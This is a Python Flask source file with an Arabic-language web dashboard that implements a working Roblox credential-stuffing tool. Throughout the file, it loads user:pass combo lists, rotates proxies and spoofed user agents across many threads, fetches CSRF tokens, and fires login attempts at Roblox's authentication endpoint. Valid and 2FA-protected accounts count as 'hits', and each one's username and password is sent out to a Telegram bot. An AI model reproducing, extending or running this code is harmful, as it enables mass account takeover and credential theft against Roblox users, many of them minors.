import os
import re
import json
import time
import threading
from queue import Queue, Empty

import requests
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO
from user_agent import generate_user_agent

app = Flask(__name__)
app.config["SECRET_KEY"] = os.urandom(24).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

STATE = {
    "running": False,
    "stats": {"hits": 0, "bad": 0, "2fa": 0, "total": 0, "processed": 0},
    "workers": 20,
    "bot_token": "",
    "chat_id": "",
    "proxies": [],
    "logs": [],
}
LOCK = threading.Lock()
STOP_FLAG = threading.Event()


def log(line: str):
    entry = f"[{time.strftime('%H:%M:%S')}] {line}"
    with LOCK:
        STATE["logs"].append(entry)
        if len(STATE["logs"]) > 500:
            STATE["logs"] = STATE["logs"][-500:]
    socketio.emit("log", {"line": entry})
    socketio.emit("stats", STATE["stats"])


def send_telegram(username, password, profile):
    token, chat = STATE["bot_token"], STATE["chat_id"]
    if not token or not chat:
        return
    try:
        msg = (
            f"✅ ROBLOX HIT!\n"
            f"👤 User: {username}\n"
            f"🔑 Pass: {password}\n"
            f"🔗 {profile}"
        )
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            json={"chat_id": chat, "text": msg},
            timeout=5,
        )
    except Exception:
        pass


def parse_proxy(p):
    if not p:
        return None
    try:
        if "@" in p:
            cred, ipport = p.split("@", 1)
            u, pw = cred.split(":", 1)
            ip, port = ipport.split(":", 1)
            url = f"http://{u}:{pw}@{ip}:{port}"
        else:
            ip, port = p.split(":", 1)
            url = f"http://{ip}:{port}"
        return {"http": url, "https": url}
    except Exception:
        return None


def check_roblox(username, password, proxies=None):
    s = requests.Session()
    s.headers.update({"User-Agent": generate_user_agent()})
    if proxies:
        s.proxies = proxies
    try:
        # 1. Get CSRF Token
        r = s.post("https://auth.roblox.com/v2/login", timeout=10)
        csrf = r.headers.get("x-csrf-token")
        if not csrf:
            return None

        # 2. Attempt Login
        login_data = {"ctype": "Username", "cvalue": username, "password": password}
        r = s.post(
            "https://auth.roblox.com/v2/login",
            json=login_data,
            headers={"x-csrf-token": csrf},
            timeout=10,
        )

        if r.status_code == 200:
            return {
                "username": username,
                "password": password,
                "profile": f"https://www.roblox.com/users/profile?username={username}",
            }

        # 3. Check for 2FA (Valid Password but needs code)
        if r.status_code == 403 and "twoStepVerificationRequired" in r.text:
            return {
                "username": username,
                "password": password,
                "profile": f"https://www.roblox.com/users/profile?username={username}",
                "2fa": True,
            }

        return None
    except Exception:
        return None


def worker(combo_queue, proxy_queue):
    while not STOP_FLAG.is_set():
        try:
            combo = combo_queue.get_nowait()
        except Empty:
            return
        with LOCK:
            STATE["stats"]["processed"] += 1

        try:
            if ":" not in combo:
                combo_queue.task_done()
                continue
            username, password = combo.split(":", 1)
        except ValueError:
            combo_queue.task_done()
            continue

        proxies = None
        if not proxy_queue.empty():
            try:
                proxies = parse_proxy(proxy_queue.get_nowait())
                proxy_queue.put("")
            except Empty:
                proxies = None

        result = check_roblox(username.strip(), password.strip(), proxies)

        with LOCK:
            if result:
                if result.get("2fa"):
                    STATE["stats"]["2fa"] += 1
                else:
                    STATE["stats"]["hits"] += 1
            else:
                STATE["stats"]["bad"] += 1

        if result:
            status = "2FA" if result.get("2fa") else "HIT"
            log(f"{status} → {username}:{password}")
            send_telegram(result["username"], result["password"], result["profile"])
        else:
            log(f"BAD → {username}")

        socketio.emit("stats", STATE["stats"])
        combo_queue.task_done()


def run_checker(combos, proxies, workers):
    with LOCK:
        STATE["stats"] = {"hits": 0, "bad": 0, "2fa": 0, "total": len(combos), "processed": 0}
    STATE["running"] = True
    STOP_FLAG.clear()
    combo_q, proxy_q = Queue(), Queue()
    for c in combos:
        combo_q.put(c)
    for p in proxies:
        proxy_q.put(p)
    log(f"Starting {workers} workers | {len(combos)} combos")
    threads = []
    for _ in range(min(workers, max(1, len(combos)))):
        t = threading.Thread(target=worker, args=(combo_q, proxy_q), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    STATE["running"] = False
    log(f"Done. Hits: {STATE['stats']['hits']} | 2FA: {STATE['stats']['2fa']} | Bad: {STATE['stats']['bad']}")


INDEX_HTML = r"""<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>RBX Checker — Terminal</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<style>
  :root { --bg:#0a0e0a; --fg:#39ff14; --dim:#1a3a1a; --err:#ff3b3b; --hit:#39ff14; }
  * { box-sizing:border-box; }
  body { margin:0; background:var(--bg); color:var(--fg); font-family:"Courier New",monospace; }
  .wrap { max-width:1100px; margin:0 auto; padding:16px; }
  h1 { font-size:16px; margin:0 0 8px; letter-spacing:2px; }
  .row { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:10px; }
  input,button,textarea,select {
    background:#000; color:var(--fg); border:1px solid var(--fg);
    font-family:inherit; padding:6px 8px; font-size:13px;
  }
  input,textarea,select { flex:1; min-width:120px; }
  textarea { min-height:80px; resize:vertical; }
  button { cursor:pointer; }
  button:hover { background:var(--fg); color:#000; }
  .term {
    background:#000; border:1px solid var(--dim); padding:10px;
    height:360px; overflow-y:auto; font-size:13px; line-height:1.5;
    white-space:pre-wrap; word-break:break-all;
  }
  .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:8px; margin:10px 0; }
  .stat { border:1px solid var(--dim); padding:8px; text-align:center; }
  .stat b { display:block; font-size:18px; }
  .hit { color:var(--hit); }
  .bad { color:#ff8888; }
  .muted { color:#5a7a5a; font-size:11px; }
  .bar { height:6px; background:var(--dim); margin:6px 0; }
  .bar>div { height:100%; background:var(--fg); width:0%; transition:width .3s; }
</style>
</head>
<body>
<div class="wrap">
  <h1>▶ RBX CHECKER — TERMINAL LIVE</h1>

  <div class="row">
    <input id="bot" placeholder="Bot Token">
    <input id="chat" placeholder="Chat ID">
  </div>

  <div class="row">
    <select id="mode">
      <option value="proxyless">Proxyless</option>
      <option value="proxy">Proxy</option>
    </select>
    <input id="workers" type="number" value="20" min="1" max="200" placeholder="Workers">
  </div>

  <div class="row">
    <input type="file" id="combo-file" accept=".txt" style="color:#39ff14; background:#000; padding:10px; border:1px dashed #39ff14;">
    <button id="btn-upload" type="button">📁 رفع الملف</button>
  </div>

  <div class="row">
    <textarea id="combos" placeholder="أو ضع الكومبو هنا يدوياً...&#10;user:pass"></textarea>
  </div>

  <div class="row">
    <textarea id="proxies" placeholder="proxy:port (سطر لكل بروكسي)"></textarea>
  </div>

  <div class="row">
    <button id="start">▶ START</button>
    <button id="stop">■ STOP</button>
    <button id="clear">CLEAR</button>
  </div>

  <div class="stats">
    <div class="stat">Total <b id="s-total">0</b></div>
    <div class="stat">Processed <b id="s-proc">0</b></div>
    <div class="stat hit">Hits <b id="s-hits">0</b></div>
    <div class="stat bad">Bad <b id="s-bad">0</b></div>
    <div class="stat">2FA <b id="s-2fa">0</b></div>
  </div>
  <div class="bar"><div id="bar"></div></div>
  <div class="muted" id="status">Idle</div>

  <div class="term" id="term"></div>
</div>

<script>
const socket = io();
const term = document.getElementById("term");

function append(cls, text) {
  const div = document.createElement("div");
  div.className = cls;
  div.textContent = text;
  term.appendChild(div);
  term.scrollTop = term.scrollHeight;
}

document.getElementById("btn-upload").onclick = async () => {
  const fileInput = document.getElementById("combo-file");
  if (!fileInput.files.length) return append("bad", "!! اختر ملف أولاً");
  
  const formData = new FormData();
  formData.append("file", fileInput.files[0]);
  
  append("", "> جاري رفع وقراءة الملف...");
  const res = await fetch("/api/upload", { method: "POST", body: formData });
  const data = await res.json();
  
  if (data.ok) {
    document.getElementById("combos").value = data.content;
    append("", "> تم تحميل الملف بنجاح ✅");
  } else {
    append("bad", "!! فشل الرفع: " + data.error);
  }
};

socket.on("log", d => {
  let cls = "";
  if (d.line.includes("HIT")) cls = "hit";
  if (d.line.includes("BAD")) cls = "bad";
  append(cls, d.line);
});

socket.on("stats", s => {
  document.getElementById("s-total").textContent = s.total;
  document.getElementById("s-proc").textContent = s.processed;
  document.getElementById("s-hits").textContent = s.hits;
  document.getElementById("s-bad").textContent = s.bad;
  document.getElementById("s-2fa").textContent = s["2fa"];
  const pct = s.total ? Math.floor(s.processed * 100 / s.total) : 0;
  document.getElementById("bar").style.width = pct + "%";
  document.getElementById("status").textContent =
    s.processed >= s.total && s.total > 0 ? "Done" : "Scanning...";
});

document.getElementById("start").onclick = async () => {
  const body = {
    bot_token: document.getElementById("bot").value.trim(),
    chat_id: document.getElementById("chat").value.trim(),
    workers: parseInt(document.getElementById("workers").value) || 20,
    combos: document.getElementById("combos").value.split("\n").map(x => x.trim()).filter(Boolean),
    proxies: document.getElementById("proxies").value.split("\n").map(x => x.trim()).filter(Boolean),
  };
  if (!body.combos.length) return append("bad", "!! no combos");
  append("", `> launching ${body.combos.length} combos with ${body.workers} workers`);
  const r = await fetch("/api/start", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(body)
  });
  const j = await r.json();
  append("", "> " + JSON.stringify(j));
};

document.getElementById("stop").onclick = async () => {
  await fetch("/api/stop", { method: "POST" });
  append("bad", "> stop signal sent");
};

document.getElementById("clear").onclick = () => { term.innerHTML = ""; };

append("", "> terminal ready — paste combos and press START");
</script>
</body>
</html>
"""


@app.route("/")
def index():
    return render_template_string(INDEX_HTML)


@app.route("/api/upload", methods=["POST"])
def api_upload():
    if "file" not in request.files:
        return jsonify({"ok": False, "error": "no file"}), 400
    file = request.files["file"]
    if file.filename == "":
        return jsonify({"ok": False, "error": "empty filename"}), 400
    try:
        content = file.read().decode("utf-8", errors="ignore")
        return jsonify({"ok": True, "content": content})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/start", methods=["POST"])
def api_start():
    if STATE["running"]:
        return jsonify({"ok": False, "error": "already running"}), 400
    data = request.get_json(force=True)
    combos = data.get("combos", [])
    proxies = data.get("proxies", [])
    workers = int(data.get("workers", 20))
    STATE["bot_token"] = data.get("bot_token", "")
    STATE["chat_id"] = data.get("chat_id", "")
    threading.Thread(
        target=run_checker, args=(combos, proxies, workers), daemon=True
    ).start()
    return jsonify({"ok": True, "queued": len(combos), "workers": workers})


@app.route("/api/stop", methods=["POST"])
def api_stop():
    STOP_FLAG.set()
    return jsonify({"ok": True})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    socketio.run(app, host="0.0.0.0", port=port, allow_unsafe_werkzeug=True)
